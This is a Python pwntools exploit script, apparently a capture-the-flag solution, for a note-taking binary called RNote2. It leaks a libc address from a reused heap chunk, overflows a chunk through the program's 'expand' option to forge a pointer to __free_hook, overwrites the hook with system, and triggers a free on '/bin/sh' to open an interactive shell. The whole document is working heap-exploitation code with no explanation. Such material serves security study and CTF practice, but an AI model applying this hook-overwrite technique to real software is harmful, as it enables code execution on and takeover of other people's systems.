from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./RNote2"
bin = ELF(file)
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}

conn = process(file, env=env)
#gdb.attach(conn)

def menu(ch):
    conn.recvuntil("choice:")
    conn.sendline(str(ch))

def add(size, content):
    menu(1)
    conn.recvuntil("length:")
    conn.sendline(str(size))
    conn.recvuntil("note content:")
    conn.send(content)

def delete(idx):
    menu(2)
    conn.recvuntil("delete?")
    conn.sendline(str(idx))

def list():
    menu(3)

def edit(idx, content):
    menu(4)
    conn.recvuntil("edit?")
    conn.sendline(str(idx))
    conn.recvuntil("new content")
    conn.send(content)
    conn.recvuntil("Done")

def expand(idx, expand_size, expand_content):
    menu(5)
    conn.recvuntil("expand?")
    conn.sendline(str(idx))
    conn.recvuntil("expand?")
    conn.sendline(str(expand_size))
    conn.recvuntil("want to expand")
    conn.send(expand_content)
    conn.recvuntil("Done")

test_content = "a"*7 + "\n"

# Libc leak
add(0x100, test_content)
add(0x100, "/bin/sh\x00\n")
delete(1)
add(0x100, test_content)
list()
conn.recvuntil(test_content)
libc_leak = u64(conn.recvn(6) + "\x00\x00")
#libc.address = libc_leak - 0x7f4a4f3a7b78 + 0x7f4a4efe3000
libc.address = libc_leak - 0x7f4743e31b78 + 0x7f4743a6e000
log.info("Libc leak: " + hex(libc_leak))

add(0x38, "a"*0x37 + "\n") # 3
add(0x100, "b"*0xf9 + "\n") # 4

fake_note = p64(0) + \
            p64(0x20) + \
            p64(0) + \
            p64(0) + \
            p64(libc.symbols['__free_hook'])

add(0x100, "f"*0x90 + fake_note + "\n") # 5
add(0x100, test_content) # 6
delete(4) # b's inserted in freelist

fake_note = "d"*8 + \
            "e"*7
expand(3, 0x100 - 0x38, "c"*0x16 + fake_note  + "\n")
edit(5, p64(libc.symbols['system']) + "\n")

delete(1)

conn.interactive()
